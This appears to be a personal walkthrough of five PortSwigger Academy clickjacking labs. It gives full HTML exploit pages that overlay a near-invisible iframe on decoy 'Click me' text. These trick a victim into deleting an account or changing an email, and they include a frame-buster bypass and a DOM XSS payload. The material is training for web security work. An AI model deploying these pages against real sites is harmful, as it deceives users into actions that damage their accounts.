# Portswigger
## Clickjacking
### Basic clickjacking with CSRF token protection
```bash

# This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

# To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: "My account"
Copy the URL
Go to: VSCode
Create generic hmtl "index.html"
Create an HTML boiler plate:

!tab 

Body:

	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .1;
			z-index: 2;
		}
		div {
			position:absolute;
			top: 495px;
			left: 65px;
			z-index: 1;
		}
	</style>
	<div>Click me</div>
	<iframe src="https://acbd1fe91faeef3fc0760f7e00c5002d.web-security-academy.net/my-account"></iframe>

Full html:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .1;
			z-index: 2;
		}
		div {
			position:absolute;
			top: 495px;
			left: 65px;
			z-index: 1;
		}
	</style>
	<div>Click me</div>
	<iframe src="https://acbd1fe91faeef3fc0760f7e00c5002d.web-security-academy.net/my-account"></iframe>
</body>
</html>

Go to: "Go to exploit server"
Body:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .1;
			z-index: 2;
		}
		div {
			position:absolute;
			top: 495px;
			left: 65px;
			z-index: 1;
		}
	</style>
	<div>Click me</div>
	<iframe src="https://acbd1fe91faeef3fc0760f7e00c5002d.web-security-academy.net/my-account"></iframe>
</body>
</html>

Store
View exploit
Verify the "Click me" is right above the "Delete account"
Once verified change the opacity to ".0001"
Body:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .0001;
			z-index: 2;
		}
		div {
			position:absolute;
			top: 495px;
			left: 65px;
			z-index: 1;
		}
	</style>
	<div>Click me</div>
	<iframe src="https://acbd1fe91faeef3fc0760f7e00c5002d.web-security-academy.net/my-account"></iframe>
</body>
</html>

Store
Deliver exploit to victim

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220527205442.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220527205544.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220527205601.png)

### Clickjacking with form input data prefilled from a URL parameter
```bash

# This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

# To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

# You can log in to your own account using the following credentials: wiener:peter

Login as wiener:peter
Go to: "My account"
Copy the URL
Go to: VSCode
Create generic hmtl "index.html"
Create an HTML boiler plate:

!tab 

Body:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .1;
			z-index: 2;
		}
		div {
			position:absolute;
			top: 450px;
			left: 75px;
			z-index: 1;
		}
	</style>
	<div>Click me</div>
	<iframe src="https://ac301f681e3742c0c02e85d000810061.web-security-academy.net/my-account?email=hecker@hecker.com"></iframe>
</body>
</html>

Similar to before, but note the additional parameter appended to the URL:

"?email=hecker@hecker.com"

Go to: "Go to exploit server"
Body:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .1;
			z-index: 2;
		}
		div {
			position:absolute;
			top: 450px;
			left: 75px;
			z-index: 1;
		}
	</style>
	<div>Click me</div>
	<iframe src="https://ac301f681e3742c0c02e85d000810061.web-security-academy.net/my-account?email=hecker@hecker.com"></iframe>
</body>
</html>

Store
View exploit
Verify the "Click me" is right above the "Update email"
Once verified change the opacity to ".0001"
Body:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .0001;
			z-index: 2;
		}
		div {
			position:absolute;
			top: 450px;
			left: 75px;
			z-index: 1;
		}
	</style>
	<div>Click me</div>
	<iframe src="https://ac301f681e3742c0c02e85d000810061.web-security-academy.net/my-account?email=hecker@hecker.com"></iframe>
</body>
</html>

Store
Deliver exploit to victim

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220527211717.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220527212316.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220527212352.png)

### Clickjacking with a frame buster script
```bash

# This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

# To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

# You can log in to your own account using the following credentials: wiener:peter

Login as wiener:peter
Go to: "My account"
Copy the URL
Go to: VSCode
Create generic hmtl "index.html"
Create an HTML boiler plate:

!tab 

Body:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .1;
			z-index: 2;
		}
		div {
			position:absolute;
			top: 450px;
			left: 75px;
			z-index: 1;
		}
	</style>
	<div>Click me</div>
	<iframe src="https://ac301f681e3742c0c02e85d000810061.web-security-academy.net/my-account?email=hecker@hecker.com"></iframe>
</body>
</html>

Similar to before, but note the additional changes due to the frame buster script.
Following the changes you will be able to test & visualize the exploit:

<iframe src="https://ac301f681e3742c0c02e85d000810061.web-security-academy.net/my-account?email=hecker@hecker.com"></iframe>

To:

<iframe id="https://ac641f8d1f423779c0c8682100c300ba.web-security-academy.net/my-account?email=hecker@hecker.com" src="https://ac641f8d1f423779c0c8682100c300ba.web-security-academy.net/my-account?email=hecker@hecker.com" sandbox="allow-forms"></iframe>

Go to: "Go to exploit server"
Body:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .1;
			z-index: 2;
		}
		div {
			position:absolute;
			top: 450px;
			left: 75px;
			z-index: 1;
		}
	</style>
	<div>Click me</div>
	<iframe id="https://ac641f8d1f423779c0c8682100c300ba.web-security-academy.net/my-account?email=hecker@hecker.com" src="https://ac641f8d1f423779c0c8682100c300ba.web-security-academy.net/my-account?email=hecker@hecker.com" sandbox="allow-forms"></iframe>
</body>
</html>

Store
View exploit
Verify the "Click me" is right above the "Update email"
Once verified change the opacity to ".0001"
Body:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .0001;
			z-index: 2;
		}
		div {
			position:absolute;
			top: 450px;
			left: 75px;
			z-index: 1;
		}
	</style>
	<div>Click me</div>
	<iframe id="https://ac641f8d1f423779c0c8682100c300ba.web-security-academy.net/my-account?email=hecker@hecker.com" src="https://ac641f8d1f423779c0c8682100c300ba.web-security-academy.net/my-account?email=hecker@hecker.com" sandbox="allow-forms"></iframe>
</body>
</html>

Store
Deliver exploit to victim

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220527213934.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220527214137.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220527214102.png)

### Exploiting clickjacking vulnerability to trigger DOM-based XSS
```bash

# This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function.

Go to: "Submit feedback"
Intercept is on
Name:

name

Email: 

hecker@hecker.com

Subject:

subject

Message:

message

Note the structure of the GET request:

GET /feedback/?name=name&email=hecker@hecker.com&subject=subject&message=message HTTP/1.1

Go to: VSCode
Create generic hmtl "index.html"
Create an HTML boiler plate:

!tab 

Body:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .1;
			z-index: 2;
		}
		div {
			position:absolute;
			top: 618px;
			left: 75px;
			z-index: 1;
		}
	</style>
	<div>Click me</div>
	<iframe src="https://ac341f6c1ef4dccfc0fcddb900a300ab.web-security-academy.net/feedback/?name=<img src=1 onerror=print()>&email=hecker@hecker.com&subject=subject&message=message#feedbackResult"></iframe>
</body>
</html>


Note the XXS attack must be structured as '<img src=1 onerror=print()' vs '<script>print(1)</script>'
Similar to before, but note the additional changes due to the "Submit feedback" GET request structure

<iframe src="https://ac341f6c1ef4dccfc0fcddb900a300ab.web-security-academy.net/feedback/?name=<img src=1 onerror=print()>&email=hecker@hecker.com&subject=subject&message=message#feedbackResult"></iframe>

Also note the feedbackResult id call at the end of the URL
I could not find any decent information as to why the POST request included:

'<span id="feedbackResult"></span>'

at the end of the html form
Or how to properly determine this DOM XSS exploit would work outside of fuzzing every parameter individually
DOM Invader did not seem to assist in any way pertaining to uncovering this exploit

Go to: "Go to exploit server"

Body:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .1;
			z-index: 2;
		}
		div {
			position:absolute;
			top: 618px;
			left: 75px;
			z-index: 1;
		}
	</style>
	<div>Click me</div>
	<iframe src="https://ac341f6c1ef4dccfc0fcddb900a300ab.web-security-academy.net/feedback/?name=<img src=1 onerror=print()>&email=hecker@hecker.com&subject=subject&message=message#feedbackResult"></iframe>
</body>
</html>

View exploit
Body:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .0001;
			z-index: 2;
		}
		div {
			position:absolute;
			top: 618px;
			left: 75px;
			z-index: 1;
		}
	</style>
	<div>Click me</div>
	<iframe src="https://ac341f6c1ef4dccfc0fcddb900a300ab.web-security-academy.net/feedback/?name=<img src=1 onerror=print()>&email=hecker@hecker.com&subject=subject&message=message#feedbackResult"></iframe>
</body>
</html>

Store
Deliver exploit to victim

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529003637.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529001214.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529002441.png)

### Multistep clickjacking
```bash

# This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

# You can log in to the account yourself using the following credentials: wiener:peter

Login as wiener:peter
Click "Delete account"
Click "No, take me back"
Go to: VSCode
Create generic hmtl "index.html"
Create an HTML boiler plate:

!tab 

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .1;
			z-index: 2;
		}
		.first, .second {
			position:absolute;
			top: 495px;
			left: 57px;
			z-index: 1;
		}
		.second {
			position:absolute;
			top: 295px;
			left: 215px;
		}
	</style>
	<div class="first">Click me first</div>
	<div class="second">Click me next</div>
	<iframe src="https://ac9a1fe81f976df6c09055e3002100b1.web-security-academy.net/my-account"></iframe>
</body>
</html>

Go to: "Go to exploit server"
Body:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .1;
			z-index: 2;
		}
		.first, .second {
			position:absolute;
			top: 495px;
			left: 57px;
			z-index: 1;
		}
		.second {
			position:absolute;
			top: 295px;
			left: 215px;
		}
	</style>
	<div class="first">Click me first</div>
	<div class="second">Click me next</div>
	<iframe src="https://ac9a1fe81f976df6c09055e3002100b1.web-security-academy.net/my-account"></iframe>
</body>
</html>

View exploit
Body:

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<style>
		iframe {
			position:relative;
			width: 500px;
			height: 700px;
			opacity: .0001;
			z-index: 2;
		}
		.first, .second {
			position:absolute;
			top: 495px;
			left: 57px;
			z-index: 1;
		}
		.second {
			position:absolute;
			top: 295px;
			left: 215px;
		}
	</style>
	<div class="first">Click me first</div>
	<div class="second">Click me next</div>
	<iframe src="https://ac9a1fe81f976df6c09055e3002100b1.web-security-academy.net/my-account"></iframe>
</body>
</html>

Store
Deliver exploit to victim

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220528201435.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220528201614.png)

#hacking 
